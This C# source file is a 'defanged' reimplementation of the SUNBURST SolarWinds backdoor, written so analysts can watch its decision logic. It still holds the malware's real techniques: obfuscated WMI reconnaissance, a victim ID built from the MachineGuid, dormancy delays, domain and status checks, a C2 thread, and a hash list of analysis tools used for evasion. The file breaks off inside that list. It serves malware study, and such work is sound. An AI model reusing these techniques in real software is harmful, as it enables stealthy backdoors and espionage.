/*Defanged version of sunburst backdoor based in the decompiled and deobfuscated version from 
 Chris Doman https://github.com/cadosecurity/MalwareAnalysis/blob/main/OrionImprovementBusinessLayer.cs 
 Basically is the defanged version so you can compile it and see what sunburst will do before it tries to 
 connect to the C2 server. Also allow to control its behavior by disabling checks, time delays, force a specific family, 
 see the proceses that you are running that sunburt is interested in and see which ones will stop it.*/

using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;


namespace fakesinburst
{
	// Token: 0x0200000C RID: 12
	class Program
	{
		// DS added to bypass
		private static bool bypassx = false;
		private static bool bypassr = false;
		private static bool bypassn = true;  //TO prevent uyou from shooting your foot.
		private static bool forcea = false;
		private static bool forceb = false;
		private static bool forcec = false;
		private static bool forced = false;
		private static bool forcee = false;
		private static bool forcef = false;
		private static bool forceg = false;
		private static bool forceh = false;
		private static bool printp = false;
		private static bool printi = false;
		private static bool printy = false;
		private static bool printm = false;
		private static bool forceu = false;
		private static string fakehost = "localhost";
		private static bool bypassw = false;


		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000047 RID: 71 RVA: 0x00004254 File Offset: 0x00002454
		public static bool IsAlive
		{
			get
			{
				object isAliveLock = Program._isAliveLock;
				bool result;
				lock (isAliveLock)
				{
					if (Program._isAlive)
					{
						result = true;
					}
					else
					{
						Program._isAlive = true;
						result = false;
					}
				}
				return result;
			}
		}

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x06000048 RID: 72 RVA: 0x000042A8 File Offset: 0x000024A8
		// (set) Token: 0x06000049 RID: 73 RVA: 0x000042F4 File Offset: 0x000024F4
		private static bool svcListModified1
		{
			get
			{
				object obj = Program.svcListModifiedLock;
				bool result;
				lock (obj)
				{
					bool svcListModified = Program._svcListModified1;
					Program._svcListModified1 = false;
					result = svcListModified;
				}
				return result;
			}
			set
			{
				object obj = Program.svcListModifiedLock;
				lock (obj)
				{
					Program._svcListModified1 = value;
				}
			}
		}

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x0600004A RID: 74 RVA: 0x00004338 File Offset: 0x00002538
		// (set) Token: 0x0600004B RID: 75 RVA: 0x0000437C File Offset: 0x0000257C
		private static bool svcListModified2
		{
			get
			{
				object obj = Program.svcListModifiedLock;
				bool svcListModified;
				lock (obj)
				{
					svcListModified = Program._svcListModified2;
				}
				return svcListModified;
			}
			set
			{
				object obj = Program.svcListModifiedLock;
				lock (obj)
				{
					Program._svcListModified2 = value;
				}
			}
		}

		// Token: 0x0600004C RID: 76 RVA: 0x000043C0 File Offset: 0x000025C0
		static void Main(string[] args)
		{
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - DEFANGED-SUNBURST v1.1 ==================== ET Lownoise 2020");
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - (-h for Help)");

			bool bypassb = false;
			bool bypasst = false;
			bool bypasss = false;
			Program.bypassx = false;
			bool bypassd = false;

			foreach (string arg in args)
			{
				if (String.Equals(arg, "-h"))
				{

					Console.WriteLine("     Example:   fakesunburst.exe -a www.something.com");
					Console.WriteLine("     Options:");
					Console.WriteLine("     -----------------------------------");
					Console.WriteLine("     -a	[host] Use this host as C2 test and DNS resolution. In the backdoor it ");
					Console.WriteLine("	        uses 'api.solarwinds.com' and {DGA}.avsvmcloud.com however by default in");
					Console.WriteLine("	        this tool it points to 'localhost' and needs to be changed wiht this flag.");
					Console.WriteLine("     -b	Bypass businesslayerhost check");
					Console.WriteLine("     -t	Bypass file timestamp check");
					Console.WriteLine("     -w	Bypass DNS resolve check");
					Console.WriteLine("     -s	Bypass status check");
					Console.WriteLine("     -x	Bypass time delays");
					Console.WriteLine("     -d	Bypass domain check");
					Console.WriteLine("     -r	Bypass drivers/processes check");
					Console.WriteLine("     -n	Bypass C2 hostname check");
					Console.WriteLine("     -1	Force Netbios Family"); 
					Console.WriteLine("     -2	Force Implink Family");
					Console.WriteLine("     -3	Force Atm Family");
					Console.WriteLine("     -4	Force Ipx Family");
					Console.WriteLine("     -5	Force InterNetwork Family");
					Console.WriteLine("     -6	Force InternetworkV6 Family");
					Console.WriteLine("     -7	Force Unknown Family");
					Console.WriteLine("     -8	Force Error Family");
					Console.WriteLine("     -p	Dont print list of processes");
					Console.WriteLine("     -i	Dont print list of services");
					Console.WriteLine("     -y	Dont print list of drivers");
					Console.WriteLine("     -m	Dont print list of network/family");
					Console.WriteLine("     -u	Force scan of connfiguration");
					Console.WriteLine("     -h	This help");
					return;
				}
				if (String.Equals(arg, "-b"))
                {
					bypassb = true;
				}
				if (String.Equals(arg, "-t"))
				{
					bypasst = true;
				}
				if (String.Equals(arg, "-s"))
				{
					bypasst = true;
				}
				if (String.Equals(arg, "-x"))
				{
					Program.bypassx = true;
				}
				if (String.Equals(arg, "-d"))
				{
					bypassd = true;
				}
				if (String.Equals(arg, "-r"))
				{
					Program.bypassr = true;
				}
				if (String.Equals(arg, "-n"))
				{
					Program.bypassn = true;
				}
				if (String.Equals(arg, "-1"))
				{
					Program.forcea = true;
				}
				if (String.Equals(arg, "-2"))
				{
					Program.forceb = true;
				}
				if (String.Equals(arg, "-3"))
				{
					Program.forcec = true;
				}
				if (String.Equals(arg, "-4"))
				{
					Program.forced = true;
				}
				if (String.Equals(arg, "-5"))
				{
					Program.forcee = true;
				}
				if (String.Equals(arg, "-6"))
				{
					Program.forcef = true;
				}
				if (String.Equals(arg, "-7"))
				{
					Program.forceg = true;
				}
				if (String.Equals(arg, "-8"))
				{
					Program.forceh = true;
				}
				if (String.Equals(arg, "-p"))
				{
					Program.printp = true;
				}
				if (String.Equals(arg, "-i"))
				{
					Program.printi = true;
				}
				if (String.Equals(arg, "-y"))
				{
					Program.printy = true;
				}
				if (String.Equals(arg, "-m"))
				{
					Program.printm = true;
				}
				if (String.Equals(arg, "-u"))
				{
					Program.forceu = true;
				}
				if (String.Equals(arg, "-a"))
				{
					Program.fakehost = args[Array.IndexOf(args, "-a")+1];
					
				}
				if (String.Equals(arg, "-w"))
				{
					Program.bypassw = true;
				}

			}


			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Will be using '" + Program.fakehost + "' as fake C2 and test connectivity via DNS resolution");
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Initializing --  Initialize()");
			
			try
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Trying to get Current Process Name and compare to hash of 'solarwinds.businesslayerhost'.");
				// solarwinds.businesslayerhost
				if ((Program.GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) == 17291806236368054941UL) || bypassb)
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check succeed sunburst running from 'solarwinds.businesslayerhost' ");
					DateTime lastWriteTime = File.GetLastWriteTime(Assembly.GetExecutingAssembly().Location);
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor file last write/modified:" + lastWriteTime);
					//random number (from 12 to 14 days)

					int num = new Random().Next(288, 336);

					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Random number of hours between 288 and 336:" + num + ". This is " + num/24 + "days.");
					if ((DateTime.Now.CompareTo(lastWriteTime.AddHours((double)num)) >= 0) || bypasst)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check succeed sunburst file was modified more than " + num + "hours ago. This is " + num / 24 + "days ago.");
						Program.instance = new NamedPipeServerStream(Program.appId);
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - New Named pipe with pipe name set to appId static value: " + Program.appId);
						Program.ConfigManager.ReadReportStatus(out Program.status);
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor Current status: " + Program.status);
						if ((Program.status != Program.ReportStatus.Truncate) || bypasss)
						{
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check succeed backdoor status is different that status 'truncate'");
							Program.DelayMin(0, 0);
							Program.domain4 = IPGlobalProperties.GetIPGlobalProperties().DomainName;
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Domain name is " + Program.domain4);
							if ((!string.IsNullOrEmpty(Program.domain4) && !Program.IsNullOrInvalidName(Program.domain4)) || bypassd)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check succeed Domain name is valid: " + Program.domain4);
								Program.DelayMin(0, 0);

								if (Program.GetOrCreateUserID(out Program.userId))
								{
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check succeed to create unique identificator.");
									Program.DelayMin(0, 0);
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Read backdoor config services status");
									Program.ConfigManager.ReadServiceStatus(false);
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - **** Almost ready to hit the fan");
									Program.Update();
									Program.instance.Close();
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Sunburst finished.");
								}
								else
								{
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check failed to create unique identificator.");
								}
							}
							else
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check failed domain is invalid. [-d to bypass]");
							}
						}
						else
						{
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check failed backdoor status is set to 'truncate'. [-s to bypass]");
						}
					}
					else
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check failed sunburst file was modified less than " + num + "hours ago. [-t to bypass]");
					}
				}
				else
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check failed sunburst not running from 'solarwinds.businesslayerhost' runnin from " + Process.GetCurrentProcess().ProcessName.ToLower() + "[-b to bypass]" );
				}
			}
			catch (Exception)
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Exception error");
			}
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - FAKESUNBURST EXIT");
		}

		// Token: 0x0600004D RID: 77 RVA: 0x000044C8 File Offset: 0x000026C8
		private static bool UpdateNotification()
		{
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Entered UpdateNotification()");
			int num = 3;
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - UpdateNotification is done " + num +  "times");
			while (num-- > 0)
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - UpdateNotification round" + num);
				Program.DelayMin(0, 0);
				
				if (Program.ProcessTracker.TrackProcesses(true))
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor TrackProcesses() complete and check now returns false");
					return false;
				}
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor CheckServerConnection() to the Internet (Actually it just checks if it can resolve)");
				if (Program.DnsHelper.CheckServerConnection(Program.fakehost) || Program.bypassw)
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor CheckServerConnection() passed.");
					return true;
				}
			}
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - CheckServerConnection() failed unable to resolve: " + Program.fakehost + " [Maybe use -a host] or [-w to bypass check]");
			return false;
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00004504 File Offset: 0x00002704
		private static void Update()
		{
			bool flag = false;
			Program.CryptoHelper cryptoHelper = new Program.CryptoHelper(Program.userId, Program.domain4);
			Program.HttpHelper httpHelper = null;
			Thread thread = null;
			bool flag2 = true;
			Program.AddressFamilyEx addressFamilyEx = Program.AddressFamilyEx.Unknown;
			int num = 0;
			bool flag3 = true;
			Program.DnsRecords dnsRecords = new Program.DnsRecords();
			Random random = new Random();
			int a = 0;
			
			if (!Program.UpdateNotification())
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - UpdateNotification() failed.");
				return;
			}
			
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - UpdateNotification() complete.");
			Program.svcListModified2 = false;
			int num2 = 1;
			while (num2 <= 3 && !flag)
			{
				Program.DelayMin(dnsRecords.A, dnsRecords.A);

				if (!Program.ProcessTracker.TrackProcesses(true))
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - TrackProcesses() complete.");
					if (Program.svcListModified1)
					{
						flag3 = true;
					}
					num = (Program.svcListModified2 ? (num + 1) : 0);
					string hostName;
					if (Program.status == Program.ReportStatus.New)
					{
						hostName = ((addressFamilyEx == Program.AddressFamilyEx.Error) ? cryptoHelper.GetCurrentString() : cryptoHelper.GetPreviousString(out flag2));
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - hostName var set to: " + hostName);
					}
					else
					{
						if (Program.status != Program.ReportStatus.Append)
						{
							break;
						}
						hostName = (flag3 ? cryptoHelper.GetNextStringEx(dnsRecords.dnssec) : cryptoHelper.GetNextString(dnsRecords.dnssec));
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - hostName var set to: " + hostName);
					}
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor is pulling the dnsRecords of C2: " + dnsRecords);

					if (bypassn) {
						hostName = Program.fakehost;
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Bypassing original C2 hostname and instead will be using " + hostName);
					}
					addressFamilyEx = Program.DnsHelper.GetAddressFamily(hostName, dnsRecords);
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - AddressFamily is (-1 Netbios, -2 ImpLink, -3 Atm, -4 Ipx, -5 InterNetwork, -6 InterNetworkV6, -7 Unknown, -8 Error) : " + addressFamilyEx + " [-1-8 to force Family]");

					if (Program.forcea) {
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing Netbios family");
						addressFamilyEx = Program.AddressFamilyEx.NetBios;
						dnsRecords.cname = Program.fakehost;
					}
					if (Program.forceb)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing ImpLink family");
						addressFamilyEx = Program.AddressFamilyEx.ImpLink;
					}
					if (Program.forcec)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing Atm family");
						addressFamilyEx = Program.AddressFamilyEx.Atm;
					}
					if (Program.forced)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing Ipx family");
						addressFamilyEx = Program.AddressFamilyEx.Ipx;
					}
					if(Program.forcee) 
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing InterNetwork family");
						addressFamilyEx = Program.AddressFamilyEx.InterNetwork;
					}
					if (Program.forcef)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing InterNetworkV6 family");
						addressFamilyEx = Program.AddressFamilyEx.InterNetworkV6;
					}
					if (Program.forceg)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing Unknown family");
						addressFamilyEx = Program.AddressFamilyEx.Unknown;
					}
					if (Program.forceh)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Forcing Error family");
						addressFamilyEx = Program.AddressFamilyEx.Error;
					}

					switch (addressFamilyEx)
					{
						case Program.AddressFamilyEx.NetBios:
							if (Program.status == Program.ReportStatus.Append)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor status is APPEND");
								flag3 = false;
								if (dnsRecords.dnssec)
								{
									a = dnsRecords.A;
									dnsRecords.A = random.Next(1, 3);
								}
							}
							if (Program.status == Program.ReportStatus.New && flag2)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Backdoor status is NEW");
								Program.status = Program.ReportStatus.Append;
								Program.ConfigManager.WriteReportStatus(Program.status);
							}
							if (!string.IsNullOrEmpty(dnsRecords.cname))
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - HTTPHELPER");
								dnsRecords.A = a;
								Program.HttpHelper.Close(httpHelper, thread);
								httpHelper = new Program.HttpHelper(Program.userId, dnsRecords);
								if (!Program.svcListModified2 || num > 1)
								{
									Program.svcListModified2 = false;
									thread = new Thread(new ThreadStart(httpHelper.Initialize))
									{
										IsBackground = true
									};
									thread.Start();
								}
							}
							num2 = 0;
							break;
						case Program.AddressFamilyEx.ImpLink:
						case Program.AddressFamilyEx.Atm:
							Program.ConfigManager.WriteReportStatus(Program.ReportStatus.Truncate);
							Program.ProcessTracker.SetAutomaticMode();
							flag = true;
							break;
						case Program.AddressFamilyEx.Ipx:
							if (Program.status == Program.ReportStatus.Append)
							{
								Program.ConfigManager.WriteReportStatus(Program.ReportStatus.New);
							}
							flag = true;
							break;
						case Program.AddressFamilyEx.InterNetwork:
						case Program.AddressFamilyEx.InterNetworkV6:
						case Program.AddressFamilyEx.Unknown:
							goto IL_1F7;
						case Program.AddressFamilyEx.Error:
							dnsRecords.A = random.Next(420, 540);
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Random dnsRecord generated.");
							break;
						default:
							goto IL_1F7;
					}
				IL_1F9:
					num2++;
					continue;
				IL_1F7:
					flag = true;
					goto IL_1F9;
				}
				break;
			}
			Program.HttpHelper.Close(httpHelper, thread);
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00004720 File Offset: 0x00002920
		private static string GetManagementObjectProperty(ManagementObject obj, string property)
		{
			object value = obj.Properties[property].Value;
			string text;
			if (((value != null) ? value.GetType() : null) == typeof(string[]))
			{
				text = string.Join(", ", from v in (string[])obj.Properties[property].Value
										 select v.ToString());
			}
			else
			{
				object value2 = obj.Properties[property].Value;
				text = (((value2 != null) ? value2.ToString() : null) ?? "");
			}
			string str = text;
			return property + ": " + str + "\n";
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000047DC File Offset: 0x000029DC
		private static string GetNetworkAdapterConfiguration()
		{
			string text = "";
			string result;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(Program.
				// Select * From Win32_NetworkAdapterConfiguration where IPEnabled=true
				ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNor3Sy0pzy/KdkxJLChJLXLOz0vLTC8tSizJzM9TKM9ILUpV8AxwzUtMyklNsS0pKk0FAA==")))
				{
					foreach (ManagementObject obj in managementObjectSearcher.Get().Cast<ManagementObject>())
					{
						text += "\n";
						// Description
						text += Program.GetManagementObjectProperty(obj, Program.ZipHelper.Unzip("c0ktTi7KLCjJzM8DAA=="));
						// MACAddress
						text += Program.GetManagementObjectProperty(obj, Program.ZipHelper.Unzip("83V0dkxJKUotLgYA"));
						// DHCPEnabled
						text += Program.GetManagementObjectProperty(obj, Program.ZipHelper.Unzip("c/FwDnDNS0zKSU0BAA=="));
						// DHCPServer
						text += Program.GetManagementObjectProperty(obj, Program.ZipHelper.Unzip("c/FwDghOLSpLLQIA"));
						// DNSHostName
						text += Program.GetManagementObjectProperty(obj, Program.ZipHelper.Unzip("c/EL9sgvLvFLzE0FAA=="));
						// DNSDomainSuffixSearchOrder
						text += Program.GetManagementObjectProperty(obj, Program.ZipHelper.Unzip("c/ELdsnPTczMCy5NS8usCE5NLErO8C9KSS0CAA=="));
						// DNSServerSearchOrder
						text += Program.GetManagementObjectProperty(obj, Program.ZipHelper.Unzip("c/ELDk4tKkstCk5NLErO8C9KSS0CAA=="));
						// IPAddress
						text += Program.GetManagementObjectProperty(obj, Program.ZipHelper.Unzip("8wxwTEkpSi0uBgA="));
						// IPSubnet
						text += Program.GetManagementObjectProperty(obj, Program.ZipHelper.Unzip("8wwILk3KSy0BAA=="));
						// DefaultIPGateway
						text += Program.GetManagementObjectProperty(obj, Program.ZipHelper.Unzip("c0lNSyzNKfEMcE8sSS1PrAQA"));
					}
					result = text;
				}
			}
			catch (Exception ex)
			{
				result = text + ex.Message;
			}
			return result;
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004998 File Offset: 0x00002B98
		private static string GetOSVersion(bool full)
		{
			if (Program.osVersion == null || Program.osInfo == null)
			{
				try
				{
					// Select * From Win32_OperatingSystem
					using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(Program.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNor3L0gtSizJzEsPriwuSc0FAA==")))
					{
						ManagementObject managementObject = managementObjectSearcher.Get().Cast<ManagementObject>().FirstOrDefault<ManagementObject>();
						// Caption
						Program.osInfo = managementObject.Properties[Program.ZipHelper.Unzip("c04sKMnMzwMA")].Value.ToString();
						// OSArchitecture
						Program.osInfo = Program.osInfo + ";" + managementObject.Properties[Program.ZipHelper.Unzip("8w92LErOyCxJTS4pLUoFAA==")].Value.ToString();
						// InstallDate
						Program.osInfo = Program.osInfo + ";" + managementObject.Properties[Program.ZipHelper.Unzip("88wrLknMyXFJLEkFAA==")].Value.ToString();
						// Organization
						Program.osInfo = Program.osInfo + ";" + managementObject.Properties[Program.ZipHelper.Unzip("8y9KT8zLrEosyczPAwA=")].Value.ToString();
						// RegisteredUser
						Program.osInfo = Program.osInfo + ";" + managementObject.Properties[Program.ZipHelper.Unzip("C0pNzywuSS1KTQktTi0CAA==")].Value.ToString();
						// Version
						string text = managementObject.Properties[Program.ZipHelper.Unzip("C0stKs7MzwMA")].Value.ToString();
						Program.osInfo = Program.osInfo + ";" + text;
						string[] array = text.Split(new char[]
						{
							'.'
						});
						Program.osVersion = array[0] + "." + array[1];
					}
				}
				catch (Exception)
				{
					Program.osVersion = Environment.OSVersion.Version.Major + "." + Environment.OSVersion.Version.Minor;
					// [E] {0} {1} {2}
					Program.osInfo = string.Format(Program.ZipHelper.Unzip("i3aNVag2qFWoNgRio1oA"), Environment.OSVersion.VersionString, Environment.OSVersion.Version, Environment.Is64BitOperatingSystem ? 64 : 32);
				}
			}
			if (!full)
			{
				return Program.osVersion;
			}
			return Program.osInfo;
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00004BE8 File Offset: 0x00002DE8
		private static string ReadDeviceInfo()
		{
			try
			{
				return (from nic in NetworkInterface.GetAllNetworkInterfaces()
						where nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback
						select nic.GetPhysicalAddress().ToString()).FirstOrDefault<string>();
			}
			catch (Exception)
			{
			}
			return null;
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00004C60 File Offset: 0x00002E60
		private static bool GetOrCreateUserID(out byte[] hash64)
		{
			string text = Program.ReadDeviceInfo();
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Device info: " + text);

			hash64 = new byte[8];
			Array.Clear(hash64, 0, hash64.Length);
			if (text == null)
			{
				return false;
			}
			text += Program.domain4;
			try
			{
				// HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
				// MachineGuid
				text += Program.RegistryHelper.GetValue(Program.ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzjQn2dwsJdwxyjfHNTC7KL85PK4lxLqosKMlPL0osyKgEAA=="), Program.ZipHelper.Unzip("801MzsjMS3UvzUwBAA=="), "");
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Registry/MachineGuid info: " + text);
			}
			catch
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Error GetOrCreateUserID");
			}
			using (MD5 md = MD5.Create())
			{
				byte[] bytes = Encoding.ASCII.GetBytes(text);
				byte[] array = md.ComputeHash(bytes);
				if (array.Length < hash64.Length)
				{
					return false;
				}
				for (int i = 0; i < array.Length; i++)
				{
					byte[] array2 = hash64;
					int num = i % hash64.Length;
					array2[num] ^= array[i];
				}
			}
			return true;
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00004D40 File Offset: 0x00002F40
		private static bool IsNullOrInvalidName(string domain4)
		{
			string[] array = domain4.ToLower().Split(new char[]
			{
				'.'
			});
			if (array.Length >= 2)
			{
				string s = array[array.Length - 2] + "." + array[array.Length - 1];
				foreach (ulong num in Program.patternHashes)
				{
					if (Program.GetHash(s) == num)
					{
						return true;
					}
				}
			}
			foreach (string pattern in Program.patternList)
			{
				if (Regex.Match(domain4, pattern).Success)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00004DD8 File Offset: 0x00002FD8
		private static void DelayMs(double minMs, double maxMs)
		{
			if ((int)maxMs == 0)
			{
				minMs = 1000.0;
				maxMs = 2000.0;
			}
			double num;
			for (num = minMs + new Random().NextDouble() * (maxMs - minMs); num >= 2147483647.0; num -= 2147483647.0)
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Sleeping execution for maximum value " + int.MaxValue + " Milliseconds. " + int.MaxValue/1000 + "secs." + int.MaxValue / 60000 + "mins. [-x to bypass]");
				Thread.Sleep(int.MaxValue);
			}
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Sleeping execution for " + (int)num + " Milliseconds. " + (int)num/ 1000 + "secs. " + (int)num / 60000 + "mins. [-x to bypass]");
			Thread.Sleep((int)num);
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Done Sleeping");
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00004E3B File Offset: 0x0000303B
		private static void DelayMin(int minMinutes, int maxMinutes)
		{
			if (Program.bypassx)
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Bypassing time delays. By default this was between 30 and 120 minutes.");
			}
			else
			{

				if (maxMinutes == 0)
				{
					minMinutes = 30;
					maxMinutes = 120;
				}
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Sleeping minimum is " + minMinutes + "mins and maximum is " + maxMinutes + "mins.");
				Program.DelayMs((double)minMinutes * 60.0 * 1000.0, (double)maxMinutes * 60.0 * 1000.0);
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00004E7C File Offset: 0x0000307C
		private static ulong GetHash(string s)
		{
			ulong num = 14695981039346656037UL;
			try
			{
				foreach (byte b in Encoding.UTF8.GetBytes(s))
				{
					num ^= (ulong)b;
					num *= 1099511628211UL;
				}
			}
			catch
			{
			}
			return num ^ 6605813339339102567UL;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00004EE4 File Offset: 0x000030E4
		private static string Quote(string s)
		{
			if (s == null || !s.Contains(" ") || s.Contains("\""))
			{
				return s;
			}
			return "\"" + s + "\"";
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00004F18 File Offset: 0x00003118
		private static string Unquote(string s)
		{
			if (s.StartsWith('"'.ToString()) && s.EndsWith('"'.ToString()))
			{
				return s.Substring(1, s.Length - 2);
			}
			return s;
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00004F5C File Offset: 0x0000315C
		private static string ByteArrayToHexString(byte[] bytes)
		{
			StringBuilder stringBuilder = new StringBuilder(bytes.Length * 2);
			foreach (byte b in bytes)
			{
				stringBuilder.AppendFormat("{0:x2}", b);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00004FA0 File Offset: 0x000031A0
		private static byte[] HexStringToByteArray(string hex)
		{
			byte[] array = new byte[hex.Length / 2];
			for (int i = 0; i < hex.Length; i += 2)
			{
				array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
			}
			return array;
		}

		// Token: 0x04000022 RID: 34
		private static volatile bool _isAlive = false;

		// Token: 0x04000023 RID: 35
		private static readonly object _isAliveLock = new object();

		// Token: 0x04000024 RID: 36
		private static readonly ulong[] assemblyTimeStamps = new ulong[]
		{
			// apimonitor-x64
			2597124982561782591UL,
			// apimonitor-x86
			2600364143812063535UL,
			// autopsy64
			13464308873961738403UL,
			// autopsy
			4821863173800309721UL,
			// autoruns64
			12969190449276002545UL,
			// autoruns
			3320026265773918739UL,
			// autorunsc64
			12094027092655598256UL,
			// autorunsc
			10657751674541025650UL,
			// binaryninja
			11913842725949116895UL,
			// blacklight
			5449730069165757263UL,
			// cff explorer
			292198192373389586UL,
			// cutter
			12790084614253405985UL,
			// de4dot
			5219431737322569038UL,
			// debugview
			15535773470978271326UL,
			// diskmon
			7810436520414958497UL,
			// dnsd
			13316211011159594063UL,
			// dnspy
			13825071784440082496UL,
			// dotpeek32
			14480775929210717493UL,
			// dotpeek64
			14482658293117931546UL,
			// dumpcap
			8473756179280619170UL,
			// evidence center
			3778500091710709090UL,
			// exeinfope
			8799118153397725683UL,
			// fakedns
			12027963942392743532UL,
